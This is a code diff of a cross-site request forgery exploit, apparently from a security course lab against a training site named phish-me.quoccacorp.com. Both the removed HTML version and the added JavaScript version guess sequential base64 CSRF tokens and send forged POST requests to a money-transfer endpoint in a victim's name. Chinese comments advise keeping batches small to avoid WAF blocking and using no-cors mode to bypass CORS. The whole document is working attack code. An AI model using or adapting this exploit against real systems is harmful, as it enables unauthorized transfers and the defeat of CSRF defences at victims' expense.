@@ -1,43 +1,32 @@
-<!DOCTYPE html>
-<html>
+const ME = "z5602760"; 
+const START = 8576; // 记得根据实时观察调整
+const COUNT = 100;  // 别一次发太多，容易被 WAF 封或者浏览器卡死
+const AMOUNT = 1;
 
-<body>
-    <iframe name="sink" style="display:none"></iframe>
-    <script>
-        const ME = "z5602760";
-        const START = 8576;   // 改成你刚观察到的当前整数
-        const COUNT = 300;
-        const AMOUNT = 1;
+async function doPhish() {
+    for (let i = 0; i < COUNT; i++) {
+        const tokenInt = START + i;
+        const token = btoa(tokenInt.toString()); // 如果后端需要 Base64
 
-        for (let i = 0; i < COUNT; i++) {
-            const tokenInt = START + i;
+        // 构造表单数据
+        const params = new URLSearchParams();
+        params.append('csrf_token', token);
+        params.append('username', ME);
+        params.append('amount', AMOUNT);
 
-            const f = document.createElement("form");
-            f.method = "POST";
-            f.action = "https://phish-me.quoccacorp.com/api/transfer";
-            f.target = "sink";
-            f.style.display = "none";
+        // 使用 fetch 发送请求
+        fetch("https://phish-me.quoccacorp.com/api/transfer", {
+            method: "POST",
+            mode: "no-cors", // 关键：CSRF 不需要读取返回结果，绕过 CORS 限制
+            body: params,
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            }
+        });
 
-            const t = document.createElement("input");
-            t.name = "csrf_token";
-            t.value = btoa(String(tokenInt));
+        // 稍微给一点点间隔，防止并发太高导致浏览器丢弃请求
+        await new Promise(r => setTimeout(r, 50)); 
+    }
+}
 
-            const u = document.createElement("input");
-            u.name = "username";
-            u.value = ME;
-
-            const a = document.createElement("input");
-            a.name = "amount";
-            a.value = String(AMOUNT);
-
-            f.appendChild(t);
-            f.appendChild(u);
-            f.appendChild(a);
-            document.body.appendChild(f);
-
-            setTimeout(() => f.submit(), i * 20);
-        }
-    </script>
-</body>
-
-</html>
+doPhish();
